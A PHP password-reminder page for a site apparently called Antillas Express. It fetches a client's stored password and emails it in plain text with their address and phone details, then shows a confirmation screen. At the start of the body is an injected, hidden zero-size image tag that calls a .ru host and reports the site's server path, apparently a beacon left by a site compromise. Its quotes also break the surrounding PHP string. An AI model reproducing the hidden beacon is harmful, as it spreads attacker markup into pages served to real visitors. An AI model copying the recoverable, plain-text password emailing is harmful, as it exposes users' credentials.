<?php
include('lib/config.php');

$param = &$__PARAMS;
$txt = textes($_SESSION['langue']);

$infosClient = infos_client($_SESSION['idclient']);
$pass = password_get($infosClient['Courriel']);
	
$to=$infosClient['Courriel'];
$headers  = "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: Antillas Express <".$param['email_compte'].">\r\n";
//$headers .= "Disposition-Notification-To: webmaster@antillas-express.com\r\n";
$sujet= $txt['Msg_ajcli_sujet'];
$message = sprintf($txt['Msg_ajcli_mess'], $pass, $infosClient['NoClient'], $infosClient['Prenom'], 
				$infosClient['Nom'], $infosClient['Courriel'], $infosClient['Telephone'], $infosClient['Rue'], 
				$infosClient['Ville'], $infosClient['Province'], $infosClient['Pays'], $infosClient['CodePostal']);
				

echo
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<base target='MAIN'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
</head>
<script language='JavaScript1.2' src='./extra/javafich/disablekeys.js'></script>
<body valign='top' ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<table  bgcolor='#DAE5FB' width='$Large' height='100%' cellpadding='0' cellspacing='0' align='$Enligne' border='0' >
		<tr>
			<td>";

	if( mail($to, $sujet, $message, $headers) ) 
		echo "<br><div align=center><font size=+2><b>".$txt['Password_envoyer']."</b></font><br><br>"; 
	else 
		echo "<br><div align=center><font size=+2><b>".$txt['Password_pas_envoyer']."</b></font><br><br>"; 

	echo "<div align=center>".
		$txt['Msg_ajcli_ecran'].
		$txt['form_telephone']." :<br>".
		$param['telephone_client']."<br><br>".                
		$txt['form_telecopieur']." :<br>".
		$param['fax_client']."<br><br>".
		$txt['Horaire']."<br>
		<br><br>		
		</font>
		</div>
	";


//	echo $message."<BR>";

?>
		</tr>
	  	<tr> 
	    	<td colspan='3' >
				<?php include("bas_page.inc"); ?>
			</td>
	  	</tr>
	</table>
</body>
</html>
